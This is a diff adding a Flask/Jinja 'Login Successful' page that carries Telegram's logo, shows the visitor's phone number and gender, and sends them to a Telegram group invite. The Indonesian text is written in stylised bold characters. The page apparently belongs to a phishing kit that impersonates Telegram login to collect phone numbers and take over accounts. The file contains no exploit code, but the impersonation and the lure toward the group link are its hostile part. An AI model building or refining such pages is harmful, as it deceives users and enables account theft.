@@ -1,0 +1,39 @@
+{% extends "layout.html" %} {% block content %}
+<div class="container">
+  <img
+    src="{{ url_for('static', filename='telegram-logo.png') }}"
+    class="logo"
+    alt="Telegram"
+  />
+  <h2 style="color: green; font-size: 24px">✅ Login Successful</h2>
+  <p class="subtitle">Welcome, {{ name or "User" }}</p>
+
+  <div
+    style="
+      text-align: left;
+      margin: 15px 0;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      background: #f9f9f9;
+    "
+  >
+    <p><strong>Phone:</strong> {{ phone }}</p>
+    {% if gender %}
+    <p><strong>Gender:</strong> {{ gender }}</p>
+    {% endif %}
+  </div>
+
+  <!-- Tombol join group -->
+  <a href="https://t.me/+f0ul5rPFAR83MDhl" target="_blank">
+    <button type="button" style="background: #0088cc">
+      𝐊𝐥𝐢𝐤 𝐮𝐧𝐭𝐮𝐤 𝐬𝐞𝐫𝐭𝐚𝐢 𝐬𝐞𝐤𝐚𝐫𝐚𝐧𝐠
+    </button>
+  </a>
+
+  <p class="footer-text">
+    𝐀𝐧𝐝𝐚 𝐭𝐞𝐥𝐚𝐡 𝐛𝐞𝐫𝐣𝐚𝐲𝐚 𝐥𝐨𝐠 𝐦𝐚𝐬𝐮𝐤. <br />
+    𝐊𝐥𝐢𝐤 𝐛𝐮𝐭𝐚𝐧𝐠 𝐝𝐢 𝐚𝐭𝐚𝐬 𝐮𝐧𝐭𝐮𝐤 𝐦𝐞𝐧𝐞𝐫𝐮𝐬𝐤𝐚𝐧 𝐤𝐞 𝐤𝐮𝐦𝐩𝐮𝐥𝐚𝐧 𝐫𝐚𝐬𝐦𝐢 𝐤𝐚𝐦𝐢.
+  </p>
+</div>
+{% endblock %}
